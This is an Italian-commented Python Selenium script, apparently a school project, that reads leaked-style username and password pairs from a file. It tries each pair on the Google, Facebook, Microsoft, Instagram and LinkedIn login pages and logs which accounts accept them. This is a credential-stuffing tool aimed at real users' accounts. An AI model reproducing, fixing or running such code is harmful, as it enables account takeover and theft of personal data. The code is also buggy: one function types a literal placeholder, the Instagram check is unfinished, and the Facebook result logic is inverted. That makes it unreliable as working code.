# PROGRAMMA DI ALAN DAVIDE BOVO, SIMONE CECCARELLI
# IS PASCAL COMANDINI 2022
# il programma è ancora in beta

from selenium import webdriver
import selenium,time

driver = webdriver.Firefox()
options = webdriver.FirefoxOptions()
options.add_argument("--disable-logging")

log = open('log.txt', 'r')
account = open('account.txt', 'w')

t = int(log.readline())

siti = [
    'https://accounts.google.com/Login',
    'https://it-it.facebook.com/login.php',
    'https://login.live.com/',
    'https://www.instagram.com/',
    'https://www.linkedin.com/login'    
]

def google(username, password):
    print("google" + " " + username + " " + password)

    #mando l'email
    driver.find_element_by_id('identifierId').send_keys(username)
    driver.find_element_by_xpath('//button[@jsname="LgbsSe"]').click()

    if len(driver.find_elements_by_xpath("//div[@text()='Impossibile trovare il tuo Account Google']")) == 0:
        #mando la password
        
        if len(driver.find_elements_by_xpath("//input[@name='password']")) > 0:
            driver.find_elements_by_name('password').send_keys(password)
            driver.find_element_by_xpath('//button[@jsname="LgbsSe"]').click()

            if len(driver.find_elements_by_xpath("//*[@text()='Questo browser o questa app potrebbero non essere sicuri.']")) > 0:
                account.write(username + " " + password + " GOOGLE: ACCOUNT TROVATO\n")
                return 

            if len(driver.find_elements_by_xpath("//*[@text()='Password errata. Riprova o fai clic su Password dimenticata per reimpostarla.']")) == 0:
                account.write(username + " " + password + " GOOGLE: ACCOUNT TROVATO\n")
            else:
                account.write(username + " " + password + " GOOGLE: ACCOUNT NON TROVATO\n")
        else:
            account.write(username + " " + password + " GOOGLE: ACCOUNT NON TROVATO\n")
    else:
        account.write(username + " " + password + " GOOGLE: ACCOUNT NON TROVATO\n")

def facebook(username, password, bol):
    print("facebook" + " " + username + " " + password)

    driver.find_element_by_name("email").send_keys(username)
    driver.find_element_by_name("pass").send_keys(password)
    if bol:
        driver.find_element_by_xpath("//button[@data-cookiebanner='accept_button']").click()
    driver.find_element_by_name("login").click()

    if len(driver.find_elements_by_xpath("//*[@text()='La password che hai inserito non è corretta. ']")) == 0 and len(driver.find_elements_by_xpath("//*[@text()='indirizzo e-mail o il numero di cellulare che hai inserito non è collegato a un account. ']")) == 0:
        account.write(username + " " + password + " FACEBOOK: ACCOUNT NON TROVATO\n")
    else:
        account.write(username + " " + password + " FACEBOOK: ACCOUNT TROVATO\n")
    

def microsoft(username, password): #COMPLETATO
    print("microsoft" + " " + username + " " + password)

    time.sleep(0.1)
    driver.find_element_by_xpath('//input[@id="i0116"]').send_keys("username")
    driver.find_element_by_id("idSIButton9").click()
    
    if len(driver.find_elements_by_id("usernameError")) > 0:
        account.write(username + " " + password + " MICROSOFT: ACCOUNT NON TROVATO\n")
    else:
        time.sleep(0.1)
        driver.find_element_by_name("passwd").send_keys(password)
        driver.find_element_by_id("idSIButton9").click()

        if len(driver.find_elements_by_id("passwordError")) > 0:
            account.write(username + " " + password + " MICROSOFT: ACCOUNT NON TROVATO\n")
        else:
            account.write(username + " " + password + " MICROSOFT: ACCOUNT TROVATO\n")

def instagram(username, password):
    print("instgram" + " " + username + " " + password)

    driver.find_element_by_xpath('//button[@tabindex="0"]').send_keys("username")
    driver.find_element_by_name('username').send_keys(username)
    driver.find_element_by_name('password').send_keys(password)
    driver.find_element_by_xpath('//button[@class="sqdOP  L3NKy   y3zKF     "]')


def linkedin(username, password): # COMPLETATO
    print("linkedin" + " " + username + " " + password)

    driver.find_element_by_id("username").send_keys(username)
    driver.find_element_by_id("password").send_keys(password)

    driver.find_element_by_xpath('//button[contains(text(), "Sign in")]').click()

    if len(driver.find_elements_by_id("error-for-username")) > 0 or len(driver.find_elements_by_id("error-for-password")) > 0:
        account.write(username + " " + password + " LINKEDIN: ACCOUNT NON TROVATO\n")
    else:
        account.write(username + " " + password + " LINKEDIN: ACCOUNT TROVATO\n")

for i in range(t):
    username = str(log.readline())
    password = str(log.readline())
    
    username = username.replace("\n", "")
    password = password.replace("\n", "")

    for element in siti:
        driver.get(str(element))

        if 'google' in element:
           google(username, password)
        elif 'facebook' in element:
            if i == 0:
                bol = True
            else:
                bol = False

            facebook(username, password, bol)
        elif 'live' in element:
            microsoft(username, password)
        elif 'instagram' in element:
            instagram(username, password)
        elif 'linkedin' in element:
            linkedin(username, password)